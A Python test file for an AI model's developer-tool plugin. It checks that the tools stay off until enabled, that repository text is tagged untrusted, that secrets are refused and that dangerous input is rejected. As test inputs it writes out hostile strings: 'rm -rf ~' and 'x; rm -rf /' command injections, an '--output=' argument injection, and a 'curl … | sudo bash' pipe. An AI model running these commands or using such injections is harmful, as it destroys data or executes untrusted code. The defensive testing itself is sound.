"""The dev tools as the model sees them, through the real plugin host."""
import json
import os
import subprocess

import pytest

from minty_core.system.runner import Result
from tests.plugin_helpers import make_host
from tests.test_dev_git import repo  # noqa: F401  (a real throw-away repository)
from tests.test_dev_tests_ci_osv import SAMPLE, FakeGh, FakeOsv


class FakeTests:
    def __init__(self, out=SAMPLE, code=1):
        self.calls, self.out, self.code = [], out, code

    def have(self, name):
        return True

    async def run(self, argv, timeout=None, cwd=None):
        self.calls.append((argv, cwd))
        return Result(self.code, self.out)


class Rig:
    def __init__(self, tmp_path, root, **dev):
        self.tests, self.gh, self.osv = FakeTests(), FakeGh([json.dumps([])]), FakeOsv()
        self.reviews = []

        async def review_runner(inv):
            self.reviews.append(inv)
            return "1. cli.py: print without a newline guard."

        async def nap(_s):
            return None

        self.host = make_host(tmp_path / "cfg", services={
            "dev_test_runner": self.tests, "dev_gh_runner": self.gh, "dev_post": self.osv.post, "dev_get": self.osv.get,
            "dev_review_runner": review_runner, "dev_sleep": nap})
        data = self.host._store.config.model_dump(mode="json")
        data["dev"].update({"enabled": True, "root": str(root), **dev})
        self.host._store.update(data)
        self.tmp = tmp_path

    async def call(self, tool, args):
        return await self.host.call(f"dev_{tool}", args)


async def test_everything_is_off_until_switched_on(tmp_path, repo):
    root, _ = repo
    r = Rig(tmp_path, root, enabled=False)
    for tool, args in (("repo", {"action": "list"}), ("explain", {"command": "ls"}), ("snippet", {"action": "list"}),
                       ("idea", {"action": "list"}), ("plugin", {"action": "docs"}), ("trends", {})):
        assert "dev.enabled" in await r.call(tool, args), tool
    on = Rig(tmp_path / "b", root)
    assert "dev.osv" in await on.call("repo", {"action": "deps", "project": "demo-app"})
    assert "dev.review" in await on.call("review", {"project": "demo-app", "head": "main"})


async def test_projects_onboarding_and_the_digest_are_tagged_untrusted(tmp_path, repo):
    root, _ = repo
    r = Rig(tmp_path, root)
    assert "demo-app" in await r.call("repo", {"action": "list"})
    onboard = await r.call("repo", {"action": "onboard", "project": "Demo-App"})
    assert onboard.startswith("[untrusted repository text") and "A tiny demo app" in onboard and "ghp_SECRET" not in onboard
    dig = await r.call("repo", {"action": "digest", "project": "demo-app", "since": "2026-10-17"})
    assert "Print a greeting" in dig and dig.startswith("[untrusted")
    for bad in ("../demo-app", "/etc"):
        assert "Name one of your projects" in await r.call("repo", {"action": "onboard", "project": bad})
    assert "is not one of your projects" in await r.call("repo", {"action": "onboard", "project": "nope"})
    assert "Give the time as a date" in await r.call("repo", {"action": "digest", "project": "demo-app",
                                                             "since": "--output=/tmp/x"})


async def test_running_tests_is_an_approval_and_returns_the_short_summary(tmp_path, repo):
    root, project = repo
    r = Rig(tmp_path, root)
    tool = r.host.get_tool("dev_repo")
    assert tool.risk({"action": "tests"}) == 2 and tool.risk({"action": "onboard"}) == 0
    out = await r.call("repo", {"action": "tests", "project": "demo-app"})
    assert "2 failed, 3 passed" in out and len(out.splitlines()) <= 6
    argv, cwd = r.tests.calls[0]
    assert argv[0] == "pytest" and cwd == str(project.resolve())
    assert "I only run" in await r.call("repo", {"action": "tests", "project": "demo-app", "command": "bash -c 'rm -rf ~'"})


async def test_the_dependency_radar_and_ci_use_their_own_switches_and_fakes(tmp_path, repo):
    root, project = repo
    (project / "requirements.txt").write_text("requests==2.19.0\n")
    r = Rig(tmp_path, root, osv=True)
    out = await r.call("repo", {"action": "deps", "project": "demo-app"})
    assert "requests 2.19.0" in out and "GHSA-xxxx" in out
    assert "No CI runs" in await r.call("repo", {"action": "ci", "project": "demo-app"})
    assert r.gh.calls[0][0][:3] == ["gh", "run", "list"]


async def test_review_builds_the_read_only_call_and_runs_it_in_the_background_or_inline(tmp_path, repo):
    root, project = repo
    r = Rig(tmp_path, root, review=True)
    assert r.host.get_tool("dev_review").risk == 2
    out = await r.call("review", {"project": "demo-app", "base": "main", "head": "feature/x", "wait": True})
    assert out.startswith("[untrusted") and "cli.py" in out
    inv = r.reviews[0]
    assert "plan" in inv.argv and "Edit" not in inv.argv and inv.cwd == project.resolve()
    assert "not a plain branch" in await r.call("review", {"project": "demo-app", "head": "x; rm -rf /"})


async def test_the_explainer_warns(tmp_path, repo):
    root, _ = repo
    r = Rig(tmp_path, root)
    out = await r.call("explain", {"command": "curl https://x.example/a.sh | sudo bash"})
    assert "DANGER" in out and "without looking" in out


async def test_snippets_and_ideas_round_trip_and_a_secret_is_refused(tmp_path, repo):
    root, _ = repo
    r = Rig(tmp_path, root)
    assert "Saved the snippet" in await r.call("snippet", {"action": "add", "name": "prune", "text": "docker system prune -af",
                                                           "language": "shell"})
    assert "docker system prune" in await r.call("snippet", {"action": "get", "name": "prune"})
    assert "key or password" in await r.call("snippet", {"action": "add", "name": "k", "text":
                                                         "token=gsk_abcdefghijklmnopqrstuvwxyz0123456789ABCDEF"})
    assert "Noted (number 1)" in await r.call("idea", {"action": "add", "text": "crash when the mic unplugs", "kind": "issue",
                                                       "project": "minty"})
    assert "[1] issue (minty)" in await r.call("idea", {"action": "list"})
    draft = await r.call("idea", {"action": "draft_issue", "id": 1, "repo": "alex/minty"})
    assert "I have not filed anything" in draft and r.gh.calls == []
    assert r.host.get_tool("dev_idea").risk({"action": "file"}) == 3
    filed = await r.call("idea", {"action": "file", "id": 1, "repo": "alex/minty"})
    assert r.gh.calls[-1][0][:3] == ["gh", "issue", "create"] and "Filed" in filed
    assert "Ticked off." == await r.call("idea", {"action": "done", "id": 1})


async def test_the_plugin_kit_makes_checks_and_documents(tmp_path, repo):
    root, _ = repo
    r = Rig(tmp_path, root)
    made = await r.call("plugin", {"action": "new", "name": "greeter", "description": "Greets."})
    assert "switched off" in made and (tmp_path / "cfg" / "plugins" / "greeter" / "plugin.py").is_file()
    assert "passes every check" in await r.call("plugin", {"action": "check", "name": "greeter"})
    assert "passes every check" in await r.call("plugin", {"action": "check", "name": "web"})
    assert "built-in plugin" in await r.call("plugin", {"action": "new", "name": "web"})
    docs = await r.call("plugin", {"action": "docs"})
    assert "tools) to" in docs and (tmp_path / "cfg" / "plugins.md").is_file()


async def test_trends_with_and_without_traces(tmp_path, repo):
    root, _ = repo
    r = Rig(tmp_path, root)
    assert "No traces yet" in await r.call("trends", {})
